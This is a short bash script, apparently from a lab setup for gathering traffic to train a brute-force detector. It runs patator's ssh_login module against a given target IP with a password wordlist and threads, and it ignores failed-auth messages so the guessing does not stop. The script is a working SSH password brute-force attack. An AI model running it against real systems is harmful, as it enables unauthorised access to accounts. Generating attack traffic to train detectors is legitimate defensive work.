#!/usr/bin/env bash
# Bruteforce training tool: patator ssh_login. Unlike hydra/medusa (which reuse one TCP
# connection for several password attempts, sshd MaxAuthTries packing), patator opens a
# fresh connection per password, so flows ~= attempts. This is the bruteforce class's volume
# workhorse, and a third distinct trained fingerprint alongside hydra and medusa. Volume
# from wordlist length + thread count. Prints TOOL / START_EPOCH / END_EPOCH. No em dashes.
set -euo pipefail
TARGET=""; USER_NAME="${USER_NAME:-labuser}"; WORDLIST="${WORDLIST:-/collect/wordlists/passwords_1000.txt}"; THREADS="${THREADS:-8}"
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="${2:?}"; shift 2;;
  --user) USER_NAME="${2:?}"; shift 2;;
  --wordlist) WORDLIST="${2:?}"; shift 2;;
  --threads) THREADS="${2:?}"; shift 2;;
  *) shift;; esac; done
[ -n "$TARGET" ] || { echo "usage: $0 --target <ip> [--user n] [--wordlist f] [--threads n]" >&2; exit 2; }

command -v patator >/dev/null 2>&1 || { echo "SKIP patator not installed" >&2; exit 3; }
[ -f "$WORDLIST" ] || { echo "SKIP wordlist missing: $WORDLIST" >&2; exit 3; }

echo "TOOL patator ssh_login host=${TARGET} user=${USER_NAME} password=FILE0 0=${WORDLIST} -t ${THREADS}"
echo "START_EPOCH $(date +%s)"
# -t threads, -x ignore the failed-auth message so patator does not stop, --max-retries 0.
patator ssh_login host="$TARGET" user="$USER_NAME" password=FILE0 "0=$WORDLIST" \
  -t "$THREADS" --max-retries 0 -x ignore:mesg='Authentication failed.' 2>&1 | tail -15 || true
echo "END_EPOCH $(date +%s)"
